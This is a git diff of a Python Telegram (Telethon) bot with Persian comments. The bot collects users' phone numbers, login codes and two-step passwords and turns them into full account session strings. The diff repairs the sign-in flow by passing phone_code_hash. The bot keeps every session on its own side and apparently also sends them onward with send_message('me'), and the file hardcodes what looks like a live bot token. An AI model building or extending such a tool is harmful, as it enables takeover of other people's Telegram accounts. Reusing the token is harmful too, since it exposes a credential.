@@ -28,9 +28,10 @@ BOT_TOKEN = "8541453435:AAEqXEyRE46CydJBPMPoKc87YwmCAHZWP54"
 
 # ذخیره اطلاعات کاربران
 user_sessions = {}
-user_sessions_data = {}  # برای ذخیره سشن ساخته شده
+user_sessions_data = {}
 
-async def create_session(phone, code, password=None):
+async def create_session(phone, code, phone_code_hash, password=None):
+    """تابع ایجاد سشن با phone_code_hash"""
     try:
         client = TelegramClient(
             StringSession(),
@@ -45,10 +46,14 @@ async def create_session(phone, code, password=None):
         )
 
         await client.connect()
-        await client.send_code_request(phone)
         
+        # ورود با کد و هش
         try:
-            await client.sign_in(phone=phone, code=code)
+            await client.sign_in(
+                phone=phone, 
+                code=code, 
+                phone_code_hash=phone_code_hash
+            )
         except Exception as e:
             if "password" in str(e).lower():
                 if not password:
@@ -112,7 +117,6 @@ async def handle_bot():
             buttons=None
         )
     
-    # دکمه دریافت سشن
     @bot.on(events.CallbackQuery(data=b"get_session"))
     async def get_session_callback(event):
         user_id = event.sender_id
@@ -122,7 +126,6 @@ async def handle_bot():
             session_string = session_data["session"]
             phone = session_data["phone"]
             
-            # ارسال فایل سشن به کاربر
             session_file = io.BytesIO(session_string.encode('utf-8'))
             session_file.name = f"session_{phone}.txt"
             
@@ -200,8 +203,15 @@ async def handle_bot():
                 )
                 
                 await temp_client.connect()
-                await temp_client.send_code_request(phone_clean)
+                
+                # 🔑 ذخیره phone_code_hash
+                sent_code = await temp_client.send_code_request(phone_clean)
+                phone_code_hash = sent_code.phone_code_hash
+                
                 await temp_client.disconnect()
+                
+                # ذخیره هش برای کاربر
+                user_sessions[user_id]["phone_code_hash"] = phone_code_hash
                 
                 await event.reply(
                     "✅ **کد ارسال شد!**\n\n"
@@ -244,8 +254,10 @@ async def handle_bot():
             
             phone = user_sessions[user_id]["phone"]
             code = user_sessions[user_id]["code"]
+            phone_code_hash = user_sessions[user_id].get("phone_code_hash")
             
-            result = await create_session(phone, code)
+            # 🔑 ارسال کد با هش
+            result = await create_session(phone, code, phone_code_hash)
             
             if "error" in result:
                 if result["error"] == "PASSWORD_REQUIRED":
@@ -259,7 +271,11 @@ async def handle_bot():
                     )
                 else:
                     await event.reply(
-                        f"❌ **خطا:** `{result['error']}`",
+                        f"❌ **خطا:** `{result['error']}`\n\n"
+                        "💡 نکات:\n"
+                        "1. کد رو درست وارد کن\n"
+                        "2. اپلیکیشن تلگرام رو ببند\n"
+                        "3. دوباره تلاش کن",
                         buttons=[
                             [Button.inline("🔄 تلاش دوباره", b"create_session")]
                         ],
@@ -270,13 +286,12 @@ async def handle_bot():
                 session_string = result["session"]
                 phone = result["phone"]
                 
-                # ذخیره سشن برای کاربر
                 user_sessions_data[user_id] = {
                     "session": session_string,
                     "phone": phone
                 }
                 
-                # ارسال فایل سشن به کاربر
+                # ارسال فایل سشن
                 session_file = io.BytesIO(session_string.encode('utf-8'))
                 session_file.name = f"session_{phone}.txt"
                 
@@ -325,12 +340,13 @@ async def handle_bot():
             password = text
             user_sessions[user_id]["step"] = "processing"
             
-            await event.reply("⏳ **در حال ورود...**", parse_mode='markdown')
+            await event.reply("⏳ **در حال ورود با رمز...**", parse_mode='markdown')
             
             phone = user_sessions[user_id]["phone"]
             code = user_sessions[user_id]["code"]
+            phone_code_hash = user_sessions[user_id].get("phone_code_hash")
             
-            result = await create_session(phone, code, password)
+            result = await create_session(phone, code, phone_code_hash, password)
             
             if "error" in result:
                 await event.reply(
@@ -345,13 +361,12 @@ async def handle_bot():
                 session_string = result["session"]
                 phone = result["phone"]
                 
-                # ذخیره سشن برای کاربر
                 user_sessions_data[user_id] = {
                     "session": session_string,
                     "phone": phone
                 }
                 
-                # ارسال فایل سشن به کاربر
+                # ارسال فایل سشن
                 session_file = io.BytesIO(session_string.encode('utf-8'))
                 session_file.name = f"session_{phone}.txt"
                 
@@ -379,7 +394,6 @@ async def handle_bot():
                     parse_mode='markdown'
                 )
                 
-                # ارسال به پیام‌های ذخیره شده
                 try:
                     await bot.send_message(
                         "me", 
